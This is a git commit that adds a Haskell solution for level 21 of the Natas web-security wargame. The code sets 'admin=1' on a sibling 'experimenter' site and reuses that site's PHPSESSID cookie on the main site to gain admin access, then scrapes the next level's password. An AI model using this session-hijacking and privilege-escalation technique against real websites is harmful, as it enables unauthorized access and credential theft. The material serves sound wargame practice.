5c8dadaab81d5a2bbc74ee53bf0757a80077b9d4
Yakov Pechersky <pechersk@deshawresearch.com>
2018-02-09 19:24:39 -0500

    natas21 soln

--- src/Natas.hs
+++ src/Natas.hs
@@ -33,6 +33,7 @@ import           Natas.Natas17             (solution)
 import           Natas.Natas18             (solution)
 import           Natas.Natas19             (solution)
 import           Natas.Natas20             (solution)
+import           Natas.Natas21             (solution)
 
 challenges :: M.Map Int Solution
 challenges = M.fromList $(getChallenges)
---
+++ src/Natas/Natas21.hs
@@ -0,0 +1,37 @@
+{-# LANGUAGE OverloadedStrings #-}
+
+module Natas.Natas21 where
+
+import           Data.Text    (Text, pack)
+import           Safe         (headMay, lastMay)
+
+import           Network.Wreq (Options, Part, cookie, cookieDomain, cookies,
+                               partText, responseCookieJar)
+
+import           Control.Lens
+
+import           Natas.Natas
+import           Natas.Parse
+
+solution :: Solution
+solution = do
+  let expUri = "http://natas21-experimenter.natas.labs.overthewire.org"
+  preq <- postLevel' 21 expUri id defaultForm
+  let placeJar = cookies ?~ (preq ^. responseCookieJar)
+      modifyCookie =
+        (cookie "PHPSESSID" . cookieDomain) .~
+        "natas21.natas.labs.overthewire.org"
+  attemptConnect (modifyCookie . placeJar)
+
+defaultForm :: [Part]
+defaultForm = [partText "admin" "1", partText "submit" "Update"]
+
+attemptConnect :: (Options -> Options) -> IO (Maybe Text)
+attemptConnect placeJar = do
+  ckireq <- getLevel' 21 (parentUri 21) placeJar
+  let body = reqBody ckireq
+      match = headMay (workupBody' extractPassword body)
+  pure $ match >>= lastMay
+
+extractPassword :: [[Text]] -> [[Text]]
+extractPassword = filter (pack "Username:" `elem`)
